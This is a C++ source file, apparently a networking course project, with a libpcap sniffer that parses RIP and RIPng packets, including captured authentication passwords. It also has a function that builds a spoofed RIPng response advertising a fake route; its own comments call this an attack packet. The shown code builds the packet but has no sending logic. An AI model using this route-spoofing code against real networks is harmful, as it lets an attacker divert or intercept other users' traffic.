
#include <iostream>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/ip6.h>
#include <pcap/pcap.h>
#include <sys/socket.h>
#include <net/ethernet.h>
#include <string>
#include <arpa/inet.h>
#include <vector>

#include "mynetinet.h"

// inspired by http://www.tcpdump.org/pcap.html
// inspired by https://www.devdungeon.com/content/using-libpcap-c

/**
 * @brief Prints error and exits.
 * @param error         PCAP error code.
 * @param errcode       Error code.
 */
void printErrorAndExit(int, int);
/**
 * @brief Prints error and exits.
 * @param error         String to print.
 * @param errcode       Error code.
 */
void printErrorAndExit(std::string, int);

void * generateRIPResponse(struct in6_addr address,
                           u_int8_t prefix,
                           u_int8_t metric = 1,
                           struct in6_addr nexthop = in6_addr{0},
                           u_int16_t tag = 0);

/*
./myripresponse -i <rozhraní> -r <IPv6>/[16-128] {-n <IPv6>} {-m [0-16]} {-t [0-65535]}, kde význam parametrů je následující: 
* -i: <rozhraní> udává rozhraní, ze kterého má být útočný paket odeslán;
* -r: v <IPv6> je IP adresa podvrhávané sítě a za lomítkem číselná délka masky sítě;
* -m: následující číslo udává RIP Metriku, tedy počet hopů, implicitně 1;
* -n: <IPv6> za tímto parametrem je adresa next-hopu pro podvrhávanou routu, implicitně ::;
* -t: číslo udává hodnotu Router Tagu, implicitně 0.
*/

/**
 * @brief Cover class for PCAP library.
 */
class Device {
    public:
        /**
         * @brief Constructor.
         * @param ifce      Interface.
         */
        Device(std::string ifce) {
            char errbuf[PCAP_ERRBUF_SIZE];
            int status;

            mhandle = pcap_create(ifce.c_str(), errbuf); // create handle
            if(mhandle == NULL) printErrorAndExit(errbuf, 2);

            status = pcap_set_promisc(mhandle, 1); // set promiscuous mode
            if(status) printErrorAndExit(status, 3);

            status = pcap_activate(mhandle); // activate handle
            if(status) printErrorAndExit(status, 4);
        }

        /**
         * @brief Destructor.
         */
        ~Device() { pcap_close(mhandle); }

    private:
        pcap_t *mhandle; /**< Handle. */
};

/**
 * @brief Route Table Record.
 */
struct RouteRecord {
    std::string address;/**< Address (IPv4, IPv6). */
    std::string mask;   /**< Mask / Prefix. */
    std::string metric; /**< Metric. */
};
/**
 * @brief Packet data class.
 */
struct Packet {
    bool valid = true;  /**< Valid packet. */

    /** @brief L2 Data. */
    struct {
        std::string protocol;   /**< L2 Protocol. */
        std::string src;        /**< L2 Source Address. */
        std::string dst;        /**< L2 Destination Address. */
    } link;
    /** @brief L3 Data. */
    struct {
        std::string protocol;   /**< L3 Protocol. */
        std::string src;        /**< L3 Source Address. */
        std::string dst;        /**< L3 Destination Address. */
    } network;
    /** @brief L4 Data. */
    struct {
        std::string protocol;   /**< L4 Protocol. */
        std::string src;        /**< L4 Source Address. */
        std::string dst;        /**< L4 Destination Address. */
    } transport;
    /** @brief RIP Data. */
    struct {
        std::string protocol;   /**< RIP Protocol. */
        std::string message;    /**< RIP Message. */
        bool isAuthentized;     /**< Authentication is present. */
        std::string authType;   /**< RIP Authentication type. */
        std::string password;   /**< RIP Authentication password. */
        std::vector<struct RouteRecord> records;    /**< Route Table Records. */
    } rip;
};

class Sniffer {
    public:
        /**
         * @brief Constructor.
         * @param ifce      Interface to sniff on.
         */
        Sniffer(std::string);
        /**
         * @brief Listens on the interface. Returns first RIP packet caught.
         * @returns Caught packet.
         */
        Packet listen();
        

        /**
         * @brief Destructor
         */
        ~Sniffer() { pcap_close(mhandle); }
    private:
        pcap_t *mhandle;            /**< Libpcap handle to the interface. */
        struct bpf_program mfilter; /**< Packet filter. */

        /**
         * @brief Parses packet. Returns Packet object.
         * @param header        Header of data.
         * @param data          Data of the packet.
         * @returns Packet object.
         */
        Packet parseRIP(struct pcap_pkthdr*, const u_char*);
};



Sniffer::Sniffer(std::string ifce) {
    char errbuf[PCAP_ERRBUF_SIZE];
    int status;
    // get ip and mask
    bpf_u_int32 mask, ip;
    status = pcap_lookupnet(ifce.c_str(), &ip, &mask, errbuf);
    if(status == -1) {
        //std::cerr << errbuf << "\n";
        ip = mask = 0;
    }
    // open session
    mhandle = pcap_open_live(ifce.c_str(), BUFSIZ, true, 1000, errbuf);
    if(mhandle == NULL) printErrorAndExit(errbuf, 2);
    // compile filter
    char netexpr[] = "port 520 or 521";
    status = pcap_compile(mhandle, &mfilter, netexpr, 0, ip);
    if(status == -1) printErrorAndExit(errbuf, 3);
    // set filter onto sniffer
    status = pcap_setfilter(mhandle, &mfilter);
    if(status == -1) printErrorAndExit(pcap_geterr(mhandle), 3);
}

constexpr size_t ethHdrSize = sizeof(struct ether_header);
constexpr size_t ipv4HdrSize = sizeof(struct ip);
constexpr size_t ipv6HdrSize = sizeof(struct ip6_hdr);
constexpr size_t udpHdrSize = sizeof(struct udphdr);
constexpr size_t ripHdrSize = sizeof(struct RIPHdr);
constexpr size_t ripAuthHdrSize = sizeof(struct RIPAuthHdr);
constexpr size_t ripRRSize = sizeof(struct RIPRouteRecord);
constexpr size_t ripngRRSize = sizeof(struct RIPngRouteRecord);

Packet Sniffer::listen() {
    struct pcap_pkthdr* header;
    const u_char * data;
    int status;
    do {
        status = pcap_next_ex(mhandle, &header, &data);
        if(status == PCAP_ERROR) { printErrorAndExit(pcap_geterr(mhandle), 4); }
        else if(header->len < ethHdrSize+ipv4HdrSize+udpHdrSize+ripHdrSize) { status = 0; continue; }
    } while(status != 1);
    return parseRIP(header, data);
}

std::string mac2str(u_int8_t* mac) {
    char tmp[18];
    snprintf(tmp, sizeof(tmp), "%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return std::string(tmp);
}
std::string ip2str(struct in_addr ip) {
    return std::string( inet_ntoa(ip) );
}
std::string ip2str(struct in6_addr ip) {
    char buffer[INET6_ADDRSTRLEN];
    if( inet_ntop(AF_INET6, (void*)ip.s6_addr, buffer, sizeof(buffer)) == NULL )
        printErrorAndExit("Invalid IPv6 address.", 7);
    return std::string(buffer);
}
std::string command2str(__u8 c) {
    switch(c) {
        case 1:  return "Request";
        case 2:  return "Response";
        case 3:  return "Trace on";
        case 4:  return "Trace off";
        case 5:  return "SUN reserved";
        case 6:  return "Triggered Request";
        case 7:  return "Triggered Response";
        case 8:  return "Triggered Acknowledgement";
        case 9:  return "Update Request";
        case 10: return "Update Response";
        case 11: return "Update Acknowledge";
        default: return "Unknown command";
    }
}
std::string authType2str(__u8 at, bool& valid) {
    switch(at) {
        case 1: return "IP Route";
        case 2: return "Simple Password";
        case 3: return "MD5";
        default: valid = false; return "Unknown Authentication Type";
    }
}

#define EtherType_IPv4 0x0008
#define EtherType_IPv6 0xDD86

// https://tools.ietf.org/html/rfc1700
#define Protocol_UDP 7
#define Protocol_RIPv2	0x11

#define VersionRIPv1 0x1
#define VersionRIPv2 0x2
#define VersionRIPng 0x1

Packet Sniffer::parseRIP(struct pcap_pkthdr* header, const u_char* data) {

    Packet p;
    size_t datasize = header->caplen;

    /* ----------------- ETHERNET ------------------- */
    struct ether_header* eth = (struct ether_header*)data;
    p.link.src = mac2str(eth->ether_shost);
    p.link.dst = mac2str(eth->ether_dhost);
    p.link.protocol = "Ethernet";
    data += ethHdrSize;
    datasize -= ethHdrSize;

    /* ----------------- IP ------------------- */
    if(eth->ether_type == EtherType_IPv4) {         // IPv4
        struct ip *ip = (struct ip *)data;
        p.network.protocol = "IPv4";
        p.network.src = ip2str( ip->ip_src );
        p.network.dst = ip2str( ip->ip_dst );
        data += ipv4HdrSize;
        datasize -= ipv4HdrSize;

    } else if(eth->ether_type == EtherType_IPv6) {  // IPv6
        struct ip6_hdr *ip = (struct ip6_hdr *)data;
        p.network.protocol = "IPv6";
        p.network.src = ip2str( ip->ip6_src );
        p.network.dst = ip2str( ip->ip6_dst );
        data += ipv6HdrSize;
        datasize -= ipv6HdrSize;

    } else {
        p.valid = false;
        return p;
    }

    /* ----------------- UDP ------------------- */
    struct udphdr * udp = (struct udphdr*)data;
    p.transport.protocol = "UDP";
    p.transport.src = std::to_string(ntohs(udp->uh_sport));
    p.transport.dst = std::to_string(ntohs(udp->uh_dport));
    data += udpHdrSize;
    datasize -= udpHdrSize;

    /* ------------------ RIP -------------------- */
    struct RIPHdr * rip = (struct RIPHdr*)data;
    p.rip.message = command2str( rip->comm );
    data += ripHdrSize;
    datasize -= ripHdrSize;

    /* -------------- RIPv1, RIPv2 --------------- */
    if(p.transport.dst == "520") {
        // version
        if(rip->version == VersionRIPv1) p.rip.protocol = "RIPv1";
        else if(rip->version == VersionRIPv2) p.rip.protocol = "RIPv2";
        else { p.valid = false; return p; }
        
        // authentication
        p.rip.isAuthentized = true;
        struct RIPAuthHdr * ripAuth = (struct RIPAuthHdr *)data;
        bool valid = true;
        p.rip.authType = authType2str( ntohs(ripAuth->type), valid);
        p.valid = valid;
        p.rip.password = ripAuth->password;
        data += ripAuthHdrSize;
        datasize -= ripAuthHdrSize;


        if((datasize % ripRRSize) != 0) { p.valid = false; return p; }
        while(datasize > 0) {
            struct RIPRouteRecord* riprecord = (struct RIPRouteRecord*)data;
            RouteRecord route;
            route.address = ip2str( riprecord->address );
            route.mask = ip2str( riprecord->res3 );
            route.metric = std::to_string( riprecord->metric >> 24 );
            p.rip.records.push_back(route);

            data += ripRRSize;
            datasize -= ripRRSize;
        }

    /* ----------------- RIPng ------------------- */
    } else if(p.transport.dst == "521") {
        if(rip->version == VersionRIPng) p.rip.protocol = "RIPng";
        else { p.valid = false; return p;}
        p.rip.isAuthentized = false;

        if((datasize % ripngRRSize) != 0) { p.valid = false; return p; }
        while(datasize > 0) {
            struct RIPngRouteRecord* riprecord = (struct RIPngRouteRecord*)data;
            RouteRecord route;
            route.address = ip2str( riprecord->dst );
            route.mask = std::to_string( riprecord->prefix );
            route.metric = std::to_string( riprecord->metric );
            p.rip.records.push_back(route);

            data += ripngRRSize;
            datasize -= ripngRRSize;
        }
    }

    return p;
}

void * generateRIPResponse(struct in6_addr address,
                           u_int8_t prefix,
                           u_int8_t metric,
                           struct in6_addr nexthop,
                           u_int16_t tag) {
    // memory & header pointers
    static unsigned char mem[ripHdrSize + /*2**/ripngRRSize];
    struct RIPHdr *p = (struct RIPHdr*)mem;
    /*
    struct RIPngRouteRecord *nexthoprr =
                    (struct RIPngRouteRecord *)(mem + ripHdrSize + ripngRRSize);
    */
    struct RIPngRouteRecord * rr = 
                    (struct RIPngRouteRecord *)(mem + ripHdrSize);

    // RIPng header
    p->comm = 2;
    p->version = VersionRIPng;
    p->res1 = 0;
    // next hop record
    /*
    nexthoprr->dst = nexthop;
    nexthoprr->tag = 0x0;
    nexthoprr->prefix = 0x0;
    nexthoprr->metric = 0xFF;
    */
    // fake record
    rr->dst = address;
    rr->tag = htons(tag);
    rr->prefix = prefix;
    rr->metric = metric;

    //
    return (void *)mem;
}

void printErrorAndExit(int error, int errcode) {
    std::cerr << pcap_statustostr(error) << "\n";
    exit(errcode);
}
void printErrorAndExit(std::string error, int errcode) {
    std::cerr << error << "\n";
    exit(errcode);
}